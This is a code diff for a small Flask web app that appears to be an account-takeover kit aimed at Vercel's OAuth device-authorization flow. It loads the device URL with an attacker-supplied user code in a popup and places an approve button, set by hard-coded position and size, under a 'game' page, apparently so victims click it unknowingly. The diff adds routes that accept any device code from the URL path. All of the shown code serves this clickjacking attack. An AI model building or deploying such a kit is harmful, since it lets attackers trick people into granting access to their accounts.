@@ -8,9 +8,6 @@ import os
 # Configuration — edit these for your target
 # ---------------------------------------------------------------------------
 
-# Target OAuth device-authorization URL — edit this for your target
-TARGET_URL = "https://vercel.com/oauth/device?user_code=DRMH-DHSK"
-
 POPUP_SIZE = [561, 560]                        # [width, height] of the popup
 BUTTON_OFFSET = {"pos": [224, 432], "size": [81, 48]}  # button position & size
 USE_HISTORY_BACK = False                      # False = reload URL; True = history.back()
@@ -20,23 +17,49 @@ USE_HISTORY_BACK = False                      # False = reload URL; True = histo
 app = Flask(__name__)
 app.secret_key = os.urandom(24)
 
-# BUTTON_OFFSET is hard-coded above, so the saved-target fallback is skipped.
-# If you prefer to use a CSS selector + saved HTML, set BUTTON_OFFSET = None
-# and provide BUTTON_SELECTOR + saved-target files under static/saved-target/.
 button = BUTTON_OFFSET
+
+DEVICE_URL = "https://vercel.com/oauth/device?user_code={code}"
 
 
 @app.route("/")
-def index():
+def index_root():
+    """Fallback: redirect to a default code or show instructions."""
     domain = request.host.split(":")[0]
-    return render_template("index.html", domain=domain)
+    return render_template("index.html", domain=domain,
+                           target_url="", code="")
+
+
+@app.route("/<code>")
+def index_with_code(code):
+    """Dynamic route: /XXXX-XXXX → uses that device code."""
+    domain = request.host.split(":")[0]
+    target_url = DEVICE_URL.format(code=code)
+    return render_template("index.html", domain=domain,
+                           target_url=target_url, code=code)
+
+
+@app.route("/game/<code>")
+def game_with_code(code):
+    """Game page for a specific device code."""
+    target_url = DEVICE_URL.format(code=code)
+    return render_template(
+        "game.html",
+        url=target_url,
+        code=code,
+        button=button,
+        popup_size=POPUP_SIZE,
+        use_history_back=USE_HISTORY_BACK,
+    )
 
 
 @app.route("/game")
-def game():
+def game_fallback():
+    """Fallback game page (no code)."""
     return render_template(
         "game.html",
-        url=TARGET_URL,
+        url="",
+        code="",
         button=button,
         popup_size=POPUP_SIZE,
         use_history_back=USE_HISTORY_BACK,
@@ -45,7 +68,7 @@ def game():
 
 @app.route("/clear")
 def clear():
-    return redirect(url_for("index"))
+    return redirect(url_for("index_root"))
 
 
 if __name__ == "__main__":
